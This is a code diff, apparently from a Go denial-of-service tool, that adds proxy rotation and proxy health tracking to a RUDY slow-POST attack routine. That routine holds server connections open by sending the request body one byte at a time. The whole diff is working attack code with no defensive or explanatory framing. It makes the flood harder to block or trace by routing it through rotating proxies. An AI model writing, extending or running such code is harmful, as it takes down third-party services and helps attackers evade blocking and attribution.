@@ -47,23 +47,51 @@ func (d *DDoSAttack) rudyConnection() {
 	// Connect
 	var conn net.Conn
 	var err error
+	var usedProxy string
 
 	dialer := &net.Dialer{
 		Timeout: d.config.Timeout,
 	}
 
-	if useTLS {
-		tlsConfig := d.createTLSConfig()
-		conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
-	} else {
-		conn, err = dialer.Dial("tcp", host+":"+port)
+	// Proxy support for RUDY attack
+	if d.config.UseProxy {
+		// Rotate proxies if enabled
+		if d.config.RotateProxy {
+			if proxyURL, ok := d.getNextProxy(); ok {
+				usedProxy = proxyURL
+				conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
+			}
+		} else if len(d.proxies) > 0 {
+			// Single-proxy mode: always use the first proxy
+			proxyURL := d.proxies[0]
+			usedProxy = proxyURL
+			conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
+		}
+	}
+
+	// Fallback to direct connection if no proxy was used
+	if conn == nil && err == nil {
+		if useTLS {
+			tlsConfig := d.createTLSConfig()
+			conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
+		} else {
+			conn, err = dialer.Dial("tcp", host+":"+port)
+		}
 	}
 
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
+		if usedProxy != "" {
+			d.markProxyFailure(usedProxy)
+		}
 		return
 	}
 	defer conn.Close()
+
+	// Successful connection via proxy – mark it healthy
+	if usedProxy != "" {
+		d.markProxySuccess(usedProxy)
+	}
 
 	atomic.AddInt64(&d.requestsSent, 1)
 
@@ -95,6 +123,9 @@ func (d *DDoSAttack) rudyConnection() {
 			_, err := conn.Write(bodyData[i : i+1])
 			if err != nil {
 				atomic.AddInt64(&d.requestsFailed, 1)
+				if usedProxy != "" {
+					d.markProxyFailure(usedProxy)
+				}
 				return
 			}
 			atomic.AddInt64(&d.bytesSent, 1)
